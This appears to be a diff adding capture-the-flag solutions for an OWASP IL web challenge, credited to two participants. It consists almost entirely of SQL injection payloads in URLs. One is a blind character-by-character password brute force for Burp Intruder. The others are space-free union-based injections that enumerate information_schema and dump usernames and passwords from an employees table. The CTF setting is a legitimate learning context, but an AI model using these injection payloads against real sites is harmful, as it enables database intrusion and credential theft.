@@ -1,0 +1,13 @@
+#CPResearch Solution:
+** blind brute force with intruder
+
+http://challenges.owaspil.ctf.today:8081/profile.php?id=if(instr(substring(password,$1$,1),char($79$)),13,0)
+
+
+
+#Avishay Robi Solution:
+** union based
+
+http://challenges.owaspil.ctf.today:8081/profile.php?id=1.1union(select(1),2,3,4,5,6,table_name,(8)from(information_schema.columns)where(locate(0x2c,PRIVILEGES)))
+http://challenges.owaspil.ctf.today:8081/profile.php?id=1.1union(select(1),2,3,4,5,6,group_concat(column_name),(8)from(information_schema.columns)where(locate(0x2c,PRIVILEGES)))
+http://challenges.owaspil.ctf.today:8081/profile.php?id=1.1union(select(1),2,3,4,5,6,group_concat(id,0x3a,username,0x3a,password,0x3c62723e),(8)from(employees))
